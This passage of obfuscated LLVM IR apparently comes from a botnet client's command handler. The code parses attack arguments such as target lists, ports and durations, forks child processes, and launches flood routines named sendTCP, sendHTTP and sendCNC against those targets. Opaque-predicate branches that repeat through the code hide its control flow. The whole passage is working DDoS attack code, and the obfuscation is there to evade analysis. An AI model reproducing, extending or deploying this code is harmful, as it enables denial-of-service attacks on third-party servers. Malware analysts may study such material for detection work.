  %603 = getelementptr inbounds i8*, i8** %602, i64 7
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @atoi(i8* %604) #10
  %606 = icmp slt i32 %605, 1
  br i1 %606, label %607, label %608

; <label>:607:                                    ; preds = %601, %592, %583, %577, %571, %originalBBpart272, %546
  br label %1358

; <label>:608:                                    ; preds = %601, %598
  %609 = load i32, i32* @x.81
  %610 = load i32, i32* @y.82
  %611 = sub i32 %609, 1
  %612 = mul i32 %609, %611
  %613 = urem i32 %612, 2
  %614 = icmp eq i32 %613, 0
  %615 = icmp slt i32 %610, 10
  %616 = or i1 %614, %615
  br i1 %616, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %608
  %617 = load i8**, i8*** %4, align 8
  %618 = getelementptr inbounds i8*, i8** %617, i64 1
  %619 = load i8*, i8** %618, align 8
  store i8* %619, i8** %15, align 8
  %620 = load i8**, i8*** %4, align 8
  %621 = getelementptr inbounds i8*, i8** %620, i64 2
  %622 = load i8*, i8** %621, align 8
  %623 = call i32 @atoi(i8* %622) #10
  store i32 %623, i32* %16, align 4
  %624 = load i8**, i8*** %4, align 8
  %625 = getelementptr inbounds i8*, i8** %624, i64 3
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 @atoi(i8* %626) #10
  store i32 %627, i32* %17, align 4
  %628 = load i8**, i8*** %4, align 8
  %629 = getelementptr inbounds i8*, i8** %628, i64 4
  %630 = load i8*, i8** %629, align 8
  %631 = call i32 @atoi(i8* %630) #10
  store i32 %631, i32* %18, align 4
  %632 = load i8**, i8*** %4, align 8
  %633 = getelementptr inbounds i8*, i8** %632, i64 5
  %634 = load i8*, i8** %633, align 8
  store i8* %634, i8** %19, align 8
  %635 = load i32, i32* %3, align 4
  %636 = icmp eq i32 %635, 8
  %637 = load i32, i32* @x.81
  %638 = load i32, i32* @y.82
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %636, label %645, label %650

; <label>:645:                                    ; preds = %originalBBpart276
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 7
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  br label %651

; <label>:650:                                    ; preds = %originalBBpart276
  br label %651

; <label>:651:                                    ; preds = %650, %645
  %652 = phi i32 [ %649, %645 ], [ 10, %650 ]
  %653 = load i32, i32* @x.81
  %654 = load i32, i32* @y.82
  %655 = sub i32 %653, 1
  %656 = mul i32 %653, %655
  %657 = urem i32 %656, 2
  %658 = icmp eq i32 %657, 0
  %659 = icmp slt i32 %654, 10
  %660 = or i1 %658, %659
  br i1 %660, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %651
  store i32 %652, i32* %20, align 4
  %661 = load i32, i32* %3, align 4
  %662 = icmp sgt i32 %661, 6
  %663 = load i32, i32* @x.81
  %664 = load i32, i32* @y.82
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %662, label %671, label %676

; <label>:671:                                    ; preds = %originalBBpart280
  %672 = load i8**, i8*** %4, align 8
  %673 = getelementptr inbounds i8*, i8** %672, i64 6
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 @atoi(i8* %674) #10
  br label %677

; <label>:676:                                    ; preds = %originalBBpart280
  br label %677

; <label>:677:                                    ; preds = %676, %671
  %678 = phi i32 [ %675, %671 ], [ 0, %676 ]
  %679 = load i32, i32* @x.81
  %680 = load i32, i32* @y.82
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %677
  store i32 %678, i32* %21, align 4
  %687 = load i8*, i8** %15, align 8
  %688 = call i8* @strstr(i8* %687, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %689 = icmp ne i8* %688, null
  %690 = load i32, i32* @x.81
  %691 = load i32, i32* @y.82
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %689, label %698, label %734

; <label>:698:                                    ; preds = %originalBBpart284
  %699 = load i8*, i8** %15, align 8
  %700 = call i8* @strtok(i8* %699, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %700, i8** %22, align 8
  br label %701

; <label>:701:                                    ; preds = %731, %698
  %702 = load i8*, i8** %22, align 8
  %703 = icmp ne i8* %702, null
  br i1 %703, label %704, label %733

; <label>:704:                                    ; preds = %701
  %705 = call i32 @listFork()
  %706 = icmp ne i32 %705, 0
  br i1 %706, label %731, label %707

; <label>:707:                                    ; preds = %704
  %708 = load i32, i32* @x.81
  %709 = load i32, i32* @y.82
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %707
  %716 = load i8*, i8** %22, align 8
  %717 = load i32, i32* %16, align 4
  %718 = load i32, i32* %17, align 4
  %719 = load i32, i32* %18, align 4
  %720 = load i8*, i8** %19, align 8
  %721 = load i32, i32* %21, align 4
  %722 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %716, i32 %717, i32 %718, i32 %719, i8* %720, i32 %721, i32 %722)
  call void @_exit(i32 0) #12
  %723 = load i32, i32* @x.81
  %724 = load i32, i32* @y.82
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  unreachable

; <label>:731:                                    ; preds = %704
  %732 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %732, i8** %22, align 8
  br label %701

; <label>:733:                                    ; preds = %701
  br label %762

; <label>:734:                                    ; preds = %originalBBpart284
  %735 = load i32, i32* @x.81
  %736 = load i32, i32* @y.82
  %737 = sub i32 %735, 1
  %738 = mul i32 %735, %737
  %739 = urem i32 %738, 2
  %740 = icmp eq i32 %739, 0
  %741 = icmp slt i32 %736, 10
  %742 = or i1 %740, %741
  br i1 %742, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %734
  %743 = call i32 @listFork()
  %744 = icmp ne i32 %743, 0
  %745 = load i32, i32* @x.81
  %746 = load i32, i32* @y.82
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %744, label %753, label %754

; <label>:753:                                    ; preds = %originalBBpart292
  br label %1358

; <label>:754:                                    ; preds = %originalBBpart292
  %755 = load i8*, i8** %15, align 8
  %756 = load i32, i32* %16, align 4
  %757 = load i32, i32* %17, align 4
  %758 = load i32, i32* %18, align 4
  %759 = load i8*, i8** %19, align 8
  %760 = load i32, i32* %21, align 4
  %761 = load i32, i32* %20, align 4
  call void @sendTCP(i8* %755, i32 %756, i32 %757, i32 %758, i8* %759, i32 %760, i32 %761)
  call void @_exit(i32 0) #12
  unreachable

; <label>:762:                                    ; preds = %733
  br label %763

; <label>:763:                                    ; preds = %762, %540
  %764 = load i8**, i8*** %4, align 8
  %765 = getelementptr inbounds i8*, i8** %764, i64 0
  %766 = load i8*, i8** %765, align 8
  %767 = call i32 @strcmp(i8* %766, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0)) #10
  %768 = icmp ne i32 %767, 0
  br i1 %768, label %943, label %769

; <label>:769:                                    ; preds = %763
  %770 = load i32, i32* @x.81
  %771 = load i32, i32* @y.82
  %772 = sub i32 %770, 1
  %773 = mul i32 %770, %772
  %774 = urem i32 %773, 2
  %775 = icmp eq i32 %774, 0
  %776 = icmp slt i32 %771, 10
  %777 = or i1 %775, %776
  br i1 %777, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %769
  %778 = load i32, i32* %3, align 4
  %779 = icmp slt i32 %778, 3
  %780 = load i32, i32* @x.81
  %781 = load i32, i32* @y.82
  %782 = sub i32 %780, 1
  %783 = mul i32 %780, %782
  %784 = urem i32 %783, 2
  %785 = icmp eq i32 %784, 0
  %786 = icmp slt i32 %781, 10
  %787 = or i1 %785, %786
  br i1 %787, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %779, label %810, label %788

; <label>:788:                                    ; preds = %originalBBpart296
  %789 = load i32, i32* @x.81
  %790 = load i32, i32* @y.82
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %788
  %797 = load i8**, i8*** %4, align 8
  %798 = getelementptr inbounds i8*, i8** %797, i64 2
  %799 = load i8*, i8** %798, align 8
  %800 = call i32 @atoi(i8* %799) #10
  %801 = icmp slt i32 %800, 1
  %802 = load i32, i32* @x.81
  %803 = load i32, i32* @y.82
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %801, label %810, label %827

; <label>:810:                                    ; preds = %originalBBpart2100, %originalBBpart296
  %811 = load i32, i32* @x.81
  %812 = load i32, i32* @y.82
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %810
  %819 = load i32, i32* @x.81
  %820 = load i32, i32* @y.82
  %821 = sub i32 %819, 1
  %822 = mul i32 %819, %821
  %823 = urem i32 %822, 2
  %824 = icmp eq i32 %823, 0
  %825 = icmp slt i32 %820, 10
  %826 = or i1 %824, %825
  br i1 %826, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %1358

; <label>:827:                                    ; preds = %originalBBpart2100
  %828 = load i8**, i8*** %4, align 8
  %829 = getelementptr inbounds i8*, i8** %828, i64 1
  %830 = load i8*, i8** %829, align 8
  store i8* %830, i8** %23, align 8
  %831 = load i8**, i8*** %4, align 8
  %832 = getelementptr inbounds i8*, i8** %831, i64 2
  %833 = load i8*, i8** %832, align 8
  %834 = call i32 @atoi(i8* %833) #10
  store i32 %834, i32* %24, align 4
  %835 = load i8*, i8** %23, align 8
  %836 = call i8* @strstr(i8* %835, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %837 = icmp ne i8* %836, null
  br i1 %837, label %838, label %894

; <label>:838:                                    ; preds = %827
  %839 = load i32, i32* @x.81
  %840 = load i32, i32* @y.82
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %838
  %847 = load i8*, i8** %23, align 8
  %848 = call i8* @strtok(i8* %847, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %848, i8** %25, align 8
  %849 = load i32, i32* @x.81
  %850 = load i32, i32* @y.82
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %857

; <label>:857:                                    ; preds = %875, %originalBBpart2108
  %858 = load i8*, i8** %25, align 8
  %859 = icmp ne i8* %858, null
  br i1 %859, label %860, label %877

; <label>:860:                                    ; preds = %857
  %861 = call i32 @listFork()
  %862 = icmp ne i32 %861, 0
  br i1 %862, label %875, label %863

; <label>:863:                                    ; preds = %860
  store i32 0, i32* %26, align 4
  br label %864

; <label>:864:                                    ; preds = %867, %863
  %865 = load i32, i32* %26, align 4
  %866 = icmp slt i32 %865, 10
  br i1 %866, label %867, label %872

; <label>:867:                                    ; preds = %864
  %868 = load i8*, i8** %23, align 8
  %869 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %868, i32 %869)
  %870 = load i32, i32* %26, align 4
  %871 = add nsw i32 %870, 1
  store i32 %871, i32* %26, align 4
  br label %864

; <label>:872:                                    ; preds = %864
  %873 = load i32, i32* @mainCommSock, align 4
  %874 = call i32 @close(i32 %873)
  call void @_exit(i32 0) #12
  unreachable

; <label>:875:                                    ; preds = %860
  %876 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %876, i8** %25, align 8
  br label %857

; <label>:877:                                    ; preds = %857
  %878 = load i32, i32* @x.81
  %879 = load i32, i32* @y.82
  %880 = sub i32 %878, 1
  %881 = mul i32 %878, %880
  %882 = urem i32 %881, 2
  %883 = icmp eq i32 %882, 0
  %884 = icmp slt i32 %879, 10
  %885 = or i1 %883, %884
  br i1 %885, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %877
  %886 = load i32, i32* @x.81
  %887 = load i32, i32* @y.82
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %942

; <label>:894:                                    ; preds = %827
  %895 = load i32, i32* @x.81
  %896 = load i32, i32* @y.82
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %894
  %903 = call i32 @listFork()
  %904 = icmp ne i32 %903, 0
  %905 = load i32, i32* @x.81
  %906 = load i32, i32* @y.82
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %904, label %913, label %914

; <label>:913:                                    ; preds = %originalBBpart2116
  br label %1358

; <label>:914:                                    ; preds = %originalBBpart2116
  store i32 0, i32* %27, align 4
  br label %915

; <label>:915:                                    ; preds = %934, %914
  %916 = load i32, i32* @x.81
  %917 = load i32, i32* @y.82
  %918 = sub i32 %916, 1
  %919 = mul i32 %916, %918
  %920 = urem i32 %919, 2
  %921 = icmp eq i32 %920, 0
  %922 = icmp slt i32 %917, 10
  %923 = or i1 %921, %922
  br i1 %923, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %915
  %924 = load i32, i32* %27, align 4
  %925 = icmp slt i32 %924, 10
  %926 = load i32, i32* @x.81
  %927 = load i32, i32* @y.82
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %925, label %934, label %939

; <label>:934:                                    ; preds = %originalBBpart2120
  %935 = load i8*, i8** %23, align 8
  %936 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %935, i32 %936)
  %937 = load i32, i32* %27, align 4
  %938 = add nsw i32 %937, 1
  store i32 %938, i32* %27, align 4
  br label %915

; <label>:939:                                    ; preds = %originalBBpart2120
  %940 = load i32, i32* @mainCommSock, align 4
  %941 = call i32 @close(i32 %940)
  call void @_exit(i32 0) #12
  unreachable

; <label>:942:                                    ; preds = %originalBBpart2112
  br label %943

; <label>:943:                                    ; preds = %942, %763
  %944 = load i8**, i8*** %4, align 8
  %945 = getelementptr inbounds i8*, i8** %944, i64 0
  %946 = load i8*, i8** %945, align 8
  %947 = call i32 @strcmp(i8* %946, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %948 = icmp ne i32 %947, 0
  br i1 %948, label %1087, label %949

; <label>:949:                                    ; preds = %943
  %950 = load i32, i32* @x.81
  %951 = load i32, i32* @y.82
  %952 = sub i32 %950, 1
  %953 = mul i32 %950, %952
  %954 = urem i32 %953, 2
  %955 = icmp eq i32 %954, 0
  %956 = icmp slt i32 %951, 10
  %957 = or i1 %955, %956
  br i1 %957, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %949
  %958 = load i32, i32* %3, align 4
  %959 = icmp slt i32 %958, 4
  %960 = load i32, i32* @x.81
  %961 = load i32, i32* @y.82
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br i1 %959, label %996, label %968

; <label>:968:                                    ; preds = %originalBBpart2124
  %969 = load i8**, i8*** %4, align 8
  %970 = getelementptr inbounds i8*, i8** %969, i64 2
  %971 = load i8*, i8** %970, align 8
  %972 = call i32 @atoi(i8* %971) #10
  %973 = icmp slt i32 %972, 1
  br i1 %973, label %996, label %974

; <label>:974:                                    ; preds = %968
  %975 = load i32, i32* @x.81
  %976 = load i32, i32* @y.82
  %977 = sub i32 %975, 1
  %978 = mul i32 %975, %977
  %979 = urem i32 %978, 2
  %980 = icmp eq i32 %979, 0
  %981 = icmp slt i32 %976, 10
  %982 = or i1 %980, %981
  br i1 %982, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %974
  %983 = load i8**, i8*** %4, align 8
  %984 = getelementptr inbounds i8*, i8** %983, i64 3
  %985 = load i8*, i8** %984, align 8
  %986 = call i32 @atoi(i8* %985) #10
  %987 = icmp slt i32 %986, 1
  %988 = load i32, i32* @x.81
  %989 = load i32, i32* @y.82
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %987, label %996, label %1013

; <label>:996:                                    ; preds = %originalBBpart2128, %968, %originalBBpart2124
  %997 = load i32, i32* @x.81
  %998 = load i32, i32* @y.82
  %999 = sub i32 %997, 1
  %1000 = mul i32 %997, %999
  %1001 = urem i32 %1000, 2
  %1002 = icmp eq i32 %1001, 0
  %1003 = icmp slt i32 %998, 10
  %1004 = or i1 %1002, %1003
  br i1 %1004, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %996
  %1005 = load i32, i32* @x.81
  %1006 = load i32, i32* @y.82
  %1007 = sub i32 %1005, 1
  %1008 = mul i32 %1005, %1007
  %1009 = urem i32 %1008, 2
  %1010 = icmp eq i32 %1009, 0
  %1011 = icmp slt i32 %1006, 10
  %1012 = or i1 %1010, %1011
  br i1 %1012, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1358

; <label>:1013:                                   ; preds = %originalBBpart2128
  %1014 = load i8**, i8*** %4, align 8
  %1015 = getelementptr inbounds i8*, i8** %1014, i64 1
  %1016 = load i8*, i8** %1015, align 8
  store i8* %1016, i8** %28, align 8
  %1017 = load i8**, i8*** %4, align 8
  %1018 = getelementptr inbounds i8*, i8** %1017, i64 2
  %1019 = load i8*, i8** %1018, align 8
  %1020 = call i32 @atoi(i8* %1019) #10
  store i32 %1020, i32* %29, align 4
  %1021 = load i8**, i8*** %4, align 8
  %1022 = getelementptr inbounds i8*, i8** %1021, i64 3
  %1023 = load i8*, i8** %1022, align 8
  %1024 = call i32 @atoi(i8* %1023) #10
  store i32 %1024, i32* %30, align 4
  %1025 = load i8*, i8** %28, align 8
  %1026 = call i8* @strstr(i8* %1025, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #10
  %1027 = icmp ne i8* %1026, null
  br i1 %1027, label %1028, label %1078

; <label>:1028:                                   ; preds = %1013
  %1029 = load i8*, i8** %28, align 8
  %1030 = call i8* @strtok(i8* %1029, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1030, i8** %31, align 8
  br label %1031

; <label>:1031:                                   ; preds = %originalBBpart2140, %1028
  %1032 = load i8*, i8** %31, align 8
  %1033 = icmp ne i8* %1032, null
  br i1 %1033, label %1034, label %1077

; <label>:1034:                                   ; preds = %1031
  %1035 = load i32, i32* @x.81
  %1036 = load i32, i32* @y.82
  %1037 = sub i32 %1035, 1
  %1038 = mul i32 %1035, %1037
  %1039 = urem i32 %1038, 2
  %1040 = icmp eq i32 %1039, 0
  %1041 = icmp slt i32 %1036, 10
  %1042 = or i1 %1040, %1041
  br i1 %1042, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1034
  %1043 = call i32 @listFork()
  %1044 = icmp ne i32 %1043, 0
  %1045 = load i32, i32* @x.81
  %1046 = load i32, i32* @y.82
  %1047 = sub i32 %1045, 1
  %1048 = mul i32 %1045, %1047
  %1049 = urem i32 %1048, 2
  %1050 = icmp eq i32 %1049, 0
  %1051 = icmp slt i32 %1046, 10
  %1052 = or i1 %1050, %1051
  br i1 %1052, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %1044, label %1059, label %1053

; <label>:1053:                                   ; preds = %originalBBpart2136
  %1054 = load i8*, i8** %31, align 8
  %1055 = load i32, i32* %29, align 4
  %1056 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %1054, i32 %1055, i32 %1056)
  %1057 = load i32, i32* @mainCommSock, align 4
  %1058 = call i32 @close(i32 %1057)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1059:                                   ; preds = %originalBBpart2136
  %1060 = load i32, i32* @x.81
  %1061 = load i32, i32* @y.82
  %1062 = sub i32 %1060, 1
  %1063 = mul i32 %1060, %1062
  %1064 = urem i32 %1063, 2
  %1065 = icmp eq i32 %1064, 0
  %1066 = icmp slt i32 %1061, 10
  %1067 = or i1 %1065, %1066
  br i1 %1067, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1059
  %1068 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i32 0, i32 0)) #2
  store i8* %1068, i8** %31, align 8
  %1069 = load i32, i32* @x.81
  %1070 = load i32, i32* @y.82
  %1071 = sub i32 %1069, 1
  %1072 = mul i32 %1069, %1071
  %1073 = urem i32 %1072, 2
  %1074 = icmp eq i32 %1073, 0
  %1075 = icmp slt i32 %1070, 10
  %1076 = or i1 %1074, %1075
  br i1 %1076, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1031

; <label>:1077:                                   ; preds = %1031
  br label %1086

; <label>:1078:                                   ; preds = %1013
  %1079 = call i32 @listFork()
  %1080 = icmp ne i32 %1079, 0
  br i1 %1080, label %1081, label %1082

; <label>:1081:                                   ; preds = %1078
  br label %1358

; <label>:1082:                                   ; preds = %1078
  %1083 = load i8*, i8** %28, align 8
  %1084 = load i32, i32* %29, align 4
  %1085 = load i32, i32* %30, align 4
  call void @sendCNC(i8* %1083, i32 %1084, i32 %1085)
  call void @_exit(i32 0) #12
  unreachable

; <label>:1086:                                   ; preds = %1077
  br label %1087

; <label>:1087:                                   ; preds = %1086, %943
  %1088 = load i8**, i8*** %4, align 8
  %1089 = getelementptr inbounds i8*, i8** %1088, i64 0
  %1090 = load i8*, i8** %1089, align 8
  %1091 = call i32 @strcmp(i8* %1090, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.109, i32 0, i32 0)) #10
  %1092 = icmp ne i32 %1091, 0
  br i1 %1092, label %1245, label %1093

; <label>:1093:                                   ; preds = %1087
  %1094 = load i32, i32* @x.81
  %1095 = load i32, i32* @y.82
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1093
  %1102 = load i32, i32* %3, align 4
  %1103 = icmp slt i32 %1102, 4
  %1104 = load i32, i32* @x.81
  %1105 = load i32, i32* @y.82
  %1106 = sub i32 %1104, 1
  %1107 = mul i32 %1104, %1106
  %1108 = urem i32 %1107, 2
  %1109 = icmp eq i32 %1108, 0
  %1110 = icmp slt i32 %1105, 10
  %1111 = or i1 %1109, %1110
  br i1 %1111, label %originalBBpart2144, label %originalBB142alteredBB

originalBBpart2144:                               ; preds = %originalBB142
  br i1 %1103, label %1140, label %1112

; <label>:1112:                                   ; preds = %originalBBpart2144
  %1113 = load i32, i32* @x.81
  %1114 = load i32, i32* @y.82
  %1115 = sub i32 %1113, 1
  %1116 = mul i32 %1113, %1115
  %1117 = urem i32 %1116, 2
  %1118 = icmp eq i32 %1117, 0
  %1119 = icmp slt i32 %1114, 10
  %1120 = or i1 %1118, %1119
  br i1 %1120, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %1112
  %1121 = load i8**, i8*** %4, align 8
  %1122 = getelementptr inbounds i8*, i8** %1121, i64 2
  %1123 = load i8*, i8** %1122, align 8
  %1124 = call i32 @atoi(i8* %1123) #10
  %1125 = icmp slt i32 %1124, 1
  %1126 = load i32, i32* @x.81
  %1127 = load i32, i32* @y.82
  %1128 = sub i32 %1126, 1
  %1129 = mul i32 %1126, %1128
  %1130 = urem i32 %1129, 2
  %1131 = icmp eq i32 %1130, 0
  %1132 = icmp slt i32 %1127, 10
  %1133 = or i1 %1131, %1132
  br i1 %1133, label %originalBBpart2148, label %originalBB146alteredBB

originalBBpart2148:                               ; preds = %originalBB146
  br i1 %1125, label %1140, label %1134

; <label>:1134:                                   ; preds = %originalBBpart2148
  %1135 = load i8**, i8*** %4, align 8
  %1136 = getelementptr inbounds i8*, i8** %1135, i64 3
  %1137 = load i8*, i8** %1136, align 8
  %1138 = call i32 @atoi(i8* %1137) #10
  %1139 = icmp slt i32 %1138, 1
  br i1 %1139, label %1140, label %1141

; <label>:1140:                                   ; preds = %1134, %originalBBpart2148, %originalBBpart2144
  br label %1358

; <label>:1141:                                   ; preds = %1134
  %1142 = load i32, i32* @x.81
  %1143 = load i32, i32* @y.82
  %1144 = sub i32 %1142, 1
  %1145 = mul i32 %1142, %1144
  %1146 = urem i32 %1145, 2
  %1147 = icmp eq i32 %1146, 0
  %1148 = icmp slt i32 %1143, 10
  %1149 = or i1 %1147, %1148
  br i1 %1149, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1141
  %1150 = load i8**, i8*** %4, align 8
  %1151 = getelementptr inbounds i8*, i8** %1150, i64 1
  %1152 = load i8*, i8** %1151, align 8
  store i8* %1152, i8** %32, align 8
  %1153 = load i8**, i8*** %4, align 8
  %1154 = getelementptr inbounds i8*, i8** %1153, i64 2
  %1155 = load i8*, i8** %1154, align 8
  %1156 = call i32 @atoi(i8* %1155) #10
  store i32 %1156, i32* %33, align 4
  %1157 = load i8**, i8*** %4, align 8
